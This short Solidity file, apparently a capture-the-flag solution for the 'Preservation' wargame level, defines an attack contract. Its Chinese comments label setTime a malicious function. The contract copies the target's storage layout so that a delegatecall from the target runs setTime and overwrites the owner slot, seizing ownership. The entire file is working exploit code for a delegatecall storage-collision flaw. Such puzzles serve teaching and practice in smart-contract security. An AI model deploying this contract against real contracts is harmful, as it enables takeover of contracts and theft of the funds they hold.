// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // 存储布局必须与 Preservation 相同
    address public timeZone1Library;  // Slot 0
    address public timeZone2Library;  // Slot 1
    address public owner;             // Slot 2
    
    // 修改 owner 的恶意函数
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}